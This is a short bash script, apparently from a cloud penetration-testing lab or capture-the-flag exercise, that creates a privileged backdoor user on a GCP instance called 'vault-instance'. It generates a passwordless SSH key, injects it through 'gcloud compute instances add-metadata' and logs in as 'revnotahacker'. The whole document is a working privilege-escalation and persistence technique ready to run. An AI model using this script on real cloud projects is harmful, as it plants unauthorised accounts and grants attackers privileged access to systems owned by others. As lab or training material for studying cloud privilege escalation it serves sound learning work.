# This script create a new priv user on a GCP instance and SSH into the instance as the new priv user. 
# define the new account username
NEWUSER="revnotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt
echo "PUB KEY:"
cat ./key.pub

# update the instance metadata
gcloud compute instances add-metadata vault-instance --metadata-from-file ssh-keys=meta.txt

ssh -i ./key "$NEWUSER"@localhost
